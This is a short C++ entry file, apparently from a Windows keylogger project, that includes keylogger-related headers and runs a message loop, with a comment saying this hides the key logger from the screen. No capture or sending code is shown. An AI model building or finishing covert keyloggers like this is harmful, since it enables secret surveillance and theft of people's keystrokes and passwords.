#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"


using namespace std;

int main()
{
    MSG msg;

    while(GetMessage (&msg , NULL, 0, 0)){

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    /* Masking the key logger so there is no screen showing up */
    return 0;
}
